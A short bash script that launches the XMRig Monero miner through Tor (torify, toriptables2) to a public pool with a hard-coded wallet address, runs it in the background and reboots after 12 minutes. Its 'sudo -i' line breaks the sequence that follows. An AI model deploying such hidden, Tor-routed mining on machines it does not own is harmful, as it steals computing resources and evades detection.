#!/bin/bash
sudo -i
cd xmrig
cd build
sudo systemctl start tor
sudo toriptables2.py -l

torify ./xmrig --no-color --donate-level 1 --cpu-priority 5 -o pool.supportxmr.com:9000 -u 42iZdPFRQPN1qpHG6niqkG6cY3oZph9Vn9JZvKZ1Guce7UVWj587z7TJ15fW85FDQHNU9Wiqe3qGXfP2VNHq4xa9MK5LUrU -p x -t 4 -k --tls -a cn/r --background
sleep 12m
shutdown -r now
